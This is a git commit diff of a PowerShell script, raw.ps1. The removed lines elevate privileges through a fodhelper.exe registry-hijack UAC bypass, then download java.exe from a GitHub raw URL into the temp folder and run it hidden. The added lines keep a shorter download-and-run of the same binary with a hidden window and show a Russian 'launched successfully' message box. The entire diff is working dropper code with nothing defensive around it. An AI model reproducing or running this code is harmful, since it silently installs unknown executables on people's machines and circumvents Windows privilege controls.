1a214624d92a5bff17cf3203f7b002ff215184b1
artla <129896279+3465h@users.noreply.github.com>
2026-04-08 19:06:59 +0300

    Update raw.ps1

--- raw.ps1
+++ raw.ps1
@@ -1,21 +1,6 @@
-if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $program = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Normal -File `"$PSCommandPath`""
-    $registryPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
-
-    if (!(Test-Path $registryPath)) { New-Item $registryPath -Force | Out-Null }
-
-    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
-    Set-ItemProperty -Path $registryPath -Name "(default)" -Value $program -Force | Out-Null
-
-    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
-    Start-Sleep 1.5
-    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
-
-    exit
-}
-
-$url = "https://github.com/3465h/idkkkk/raw/refs/heads/main/java.exe"
-$file = "$env:TEMP\$([guid]::NewGuid()).exe"
-
-Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing -ErrorAction Stop;
-Start-Process -FilePath $file -WindowStyle Hidden -Wait;
+$u="https://github.com/3465h/idkkkk/raw/refs/heads/main/java.exe";
+$p="$env:temp\java.exe";
+curl.exe -L $u -o $p;
+saps $p -WindowStyle Hidden;
+Add-Type -AssemblyName Microsoft.VisualBasic;
+[Microsoft.VisualBasic.Interaction]::MsgBox("Файл успешно запущен из Temp!", "OKOnly,Information", "Статус")
